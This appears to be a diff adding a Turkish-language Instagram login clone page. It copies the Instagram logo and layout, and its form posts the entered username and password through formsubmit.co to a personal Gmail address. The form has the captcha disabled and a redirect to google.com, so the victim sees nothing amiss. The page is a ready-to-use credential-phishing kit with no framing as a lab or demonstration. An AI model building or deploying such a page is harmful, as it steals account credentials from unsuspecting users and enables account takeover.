@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Instagram Giriş Klonu</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      width: 350px;
+      text-align: center;
+    }
+    .login-box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px 40px 20px;
+      margin-bottom: 10px;
+    }
+    .logo {
+      width: 180px;
+      margin-bottom: 30px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background-color: #fafafa;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+    .divider {
+      margin: 15px 0;
+      position: relative;
+      font-size: 14px;
+      color: #8e8e8e;
+    }
+    .divider::before,
+    .divider::after {
+      content: "";
+      position: absolute;
+      height: 1px;
+      background-color: #dbdbdb;
+      top: 50%;
+      width: 40%;
+    }
+    .divider::before {
+      left: 0;
+    }
+    .divider::after {
+      right: 0;
+    }
+    .facebook-login, .forgot {
+      display: block;
+      margin-top: 15px;
+      text-decoration: none;
+      color: #385185;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" class="logo" alt="Instagram Logo">
+      
+      <!-- 🔽 Form Başlangıcı -->
+      <form action="https://formsubmit.co/emre9kaya@gmail.com" method="POST">
+        <!-- formsubmit config (gizli alanlar) -->
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="box">
+        <input type="hidden" name="_subject" value="Yeni Instagram Giriş!">
+        <input type="hidden" name="_next" value="https://google.com">
+
+        <!-- kullanıcıdan alınacak bilgiler -->
+        <input type="text" name="Kullanıcı Adı / E-posta" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required />
+        <input type="password" name="Şifre" placeholder="Şifre" required />
+        <button type="submit">Giriş Yap</button>
+      </form>
+      <!-- 🔼 Form Sonu -->
+
+      <div class="divider">YA DA</div>
+      <a href="#" class="facebook-login">Facebook ile Giriş Yap</a>
+      <a href="#" class="forgot">Şifreni mi unuttun?</a>
+    </div>
+  </div>
+</body>
+</html>
